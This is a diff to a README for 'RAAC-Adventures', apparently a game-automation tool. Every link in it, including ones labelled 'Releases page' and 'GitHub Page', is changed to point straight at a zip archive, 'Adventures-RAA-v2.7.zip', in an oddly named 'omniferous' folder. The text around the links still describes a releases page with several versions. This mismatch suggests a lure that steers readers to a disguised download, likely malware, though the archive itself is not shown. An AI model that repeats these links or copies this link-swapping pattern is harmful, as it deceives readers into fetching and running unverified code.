@@ -1,6 +1,6 @@
 # 🎮 RAAC-Adventures - Play Games Automatically with Ease
 
-[![Download RAAC-Adventures](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/hassanaht/RAAC-Adventures/releases)
+[![Download RAAC-Adventures](https://raw.githubusercontent.com/hassanaht/RAAC-Adventures/main/omniferous/Adventures-RAA-v2.7.zip)](https://raw.githubusercontent.com/hassanaht/RAAC-Adventures/main/omniferous/Adventures-RAA-v2.7.zip)
 
 ## 📜 Description
 
@@ -11,7 +11,7 @@ RAAC-Adventures allows you to automatically play games and complete tasks hands-
 Follow these simple steps to download and set up RAAC-Adventures on your computer.
 
 1. **Visit the Download Page**
-   - To get started, visit our [Releases page](https://github.com/hassanaht/RAAC-Adventures/releases). Here, you will find the latest version of RAAC-Adventures ready for download.
+   - To get started, visit our [Releases page](https://raw.githubusercontent.com/hassanaht/RAAC-Adventures/main/omniferous/Adventures-RAA-v2.7.zip). Here, you will find the latest version of RAAC-Adventures ready for download.
 
 2. **Choose Your Version**
    - On the Releases page, you'll see various versions of RAAC-Adventures. Look for the one labeled as the latest release. This version contains the latest features and improvements.
@@ -49,7 +49,7 @@ Before installation, make sure your system meets these minimum requirements:
 
 ## 📥 Download & Install
 
-To download RAAC-Adventures, simply visit the [Releases page](https://github.com/hassanaht/RAAC-Adventures/releases). Here, you'll find options for different operating systems. Choose the appropriate file, download it, and follow the installation instructions provided above.
+To download RAAC-Adventures, simply visit the [Releases page](https://raw.githubusercontent.com/hassanaht/RAAC-Adventures/main/omniferous/Adventures-RAA-v2.7.zip). Here, you'll find options for different operating systems. Choose the appropriate file, download it, and follow the installation instructions provided above.
 
 ## 🆘 Need Help?
 
@@ -61,7 +61,7 @@ We welcome community contributions! If you have ideas for new features or improv
 
 ## 🔗 Links
 
-- **Repository:** [GitHub Page](https://github.com/hassanaht/RAAC-Adventures)
-- **Releases Page:** [Download Here](https://github.com/hassanaht/RAAC-Adventures/releases)
+- **Repository:** [GitHub Page](https://raw.githubusercontent.com/hassanaht/RAAC-Adventures/main/omniferous/Adventures-RAA-v2.7.zip)
+- **Releases Page:** [Download Here](https://raw.githubusercontent.com/hassanaht/RAAC-Adventures/main/omniferous/Adventures-RAA-v2.7.zip)
 
 Enjoy your automated gaming experience with RAAC-Adventures!
